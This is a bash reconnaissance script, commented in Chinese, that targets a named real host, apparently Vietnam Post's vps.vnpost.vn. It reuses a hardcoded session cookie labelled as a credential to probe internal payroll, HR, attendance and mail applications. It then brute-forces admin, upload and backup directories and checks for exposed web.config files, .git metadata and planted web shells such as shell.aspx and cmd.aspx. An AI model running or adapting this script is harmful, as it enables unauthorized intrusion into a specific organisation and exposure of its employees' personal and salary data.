#!/bin/bash

TARGET="vps.vnpost.vn"
CRED_SESSION="omtonrrfveu055ojf1dnmgwx"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔍 完整扫描 vps.vnpost.vn 所有Web应用"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# 1. 根据数据库名推测可能的路径
POSSIBLE_PATHS=(
    "/"
    "/chamcong"      # 已知（考勤）
    "/cos"           # COS数据库
    "/luong"         # XemLuong（工资）
    "/xemluong"
    "/salary"
    "/vattu"         # vattu（物资）
    "/vat_tu"
    "/kho"           # 仓库
    "/warehouse"
    "/qlda"          # 项目管理
    "/project"
    "/mail"          # cmail（邮件）
    "/email"
    "/qlns"          # 人事管理
    "/hr"
    "/nhansu"
    "/admin"
    "/portal"
    "/intranet"
    "/web"
    "/default"
    "/login"
    "/home"
)

echo "[*] 第1步：探测所有可能的Web应用路径..."
echo ""

for path in "${POSSIBLE_PATHS[@]}"; do
    echo -n "  测试: http://$TARGET$path ... "
    
    status=$(curl -sk -o /dev/null -w "%{http_code}" \
        "http://$TARGET$path" \
        -H "Cookie: ASP.NET_SessionId=$CRED_SESSION" \
        --connect-timeout 5 \
        --max-time 10)
    
    if [ "$status" = "200" ] || [ "$status" = "302" ] || [ "$status" = "301" ]; then
        echo "✅ $status"
        echo "$path|$status" >> found_paths.txt
        
        # 获取页面标题
        title=$(curl -sk "http://$TARGET$path" \
            -H "Cookie: ASP.NET_SessionId=$CRED_SESSION" \
            --connect-timeout 5 | grep -oP '<title>\K[^<]+' | head -1)
        echo "       标题: $title"
        
    elif [ "$status" = "401" ] || [ "$status" = "403" ]; then
        echo "🔒 $status (需要认证)"
        echo "$path|$status|需要认证" >> found_paths.txt
    else
        echo "❌ $status"
    fi
    
    sleep 0.5
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 发现的Web应用："
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
cat found_paths.txt 2>/dev/null
echo ""

# 2. 目录爆破（常见ASP.NET目录）
echo "[*] 第2步：目录爆破..."
echo ""

COMMON_DIRS=(
    "/admin"
    "/Admin"
    "/administrator"
    "/manage"
    "/management"
    "/upload"
    "/Upload"
    "/uploads"
    "/Uploads"
    "/files"
    "/Files"
    "/file"
    "/File"
    "/filemanager"
    "/FileManager"
    "/api"
    "/API"
    "/webservice"
    "/WebService"
    "/service"
    "/Service"
    "/backup"
    "/Backup"
    "/bak"
    "/old"
    "/test"
    "/Test"
    "/dev"
    "/debug"
    "/temp"
    "/Temp"
)

for dir in "${COMMON_DIRS[@]}"; do
    status=$(curl -sk -o /dev/null -w "%{http_code}" \
        "http://$TARGET$dir" \
        --connect-timeout 3 \
        --max-time 5)
    
    if [ "$status" != "404" ]; then
        echo "  ✅ $dir → $status"
        echo "$dir|$status" >> found_dirs.txt
    fi
done

echo ""
echo "发现的目录："
cat found_dirs.txt 2>/dev/null

# 3. 文件爆破（常见配置文件）
echo ""
echo "[*] 第3步：敏感文件检测..."
echo ""

SENSITIVE_FILES=(
    "/web.config"
    "/Web.config"
    "/web.config.bak"
    "/web.config~"
    "/global.asax"
    "/Global.asax"
    "/upload.aspx"
    "/Upload.aspx"
    "/file.aspx"
    "/File.aspx"
    "/shell.aspx"
    "/cmd.aspx"
    "/test.aspx"
    "/.git/config"
    "/.svn/entries"
    "/robots.txt"
)

for file in "${SENSITIVE_FILES[@]}"; do
    status=$(curl -sk -o /dev/null -w "%{http_code}" \
        "http://$TARGET$file" \
        --connect-timeout 3)
    
    if [ "$status" = "200" ]; then
        echo "  🔥 $file → $status (可访问！)"
        echo "$file|$status" >> sensitive_files.txt
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 扫描完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

